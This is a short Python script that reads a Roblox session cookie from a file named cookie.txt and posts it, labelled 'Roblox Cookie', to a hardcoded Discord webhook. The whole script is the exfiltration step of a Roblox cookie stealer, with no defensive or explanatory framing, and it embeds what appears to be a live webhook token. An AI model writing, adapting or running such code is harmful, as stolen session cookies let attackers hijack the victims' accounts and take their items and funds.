import requests

# Define the webhook URL
webhook_url = 'https://discord.com/api/webhooks/1115022728144105553/Bp0OjKzz4uLjb35546qtni-z_Grxy0xPyJ4lY2HyIGQ2LsbHqGT9b6TlCBtPLX8V_g2_'

# Read the cookie from cookie.txt
with open('cookie.txt', 'r') as file:
    cookie = file.read().strip()

# Create the payload with an embed
payload = {
    'embeds': [
        {
            'title': 'Roblox Cookie',
            'description': f'Cookie: {cookie}'
        }
    ]
}

# Send the payload to the webhook
response = requests.post(webhook_url, json=payload)

# Check the response status
if response.ok:
    print('Cookie sent successfully to the webhook!')
else:
    print('Failed to send the cookie to the webhook. Status code:', response.status_code)
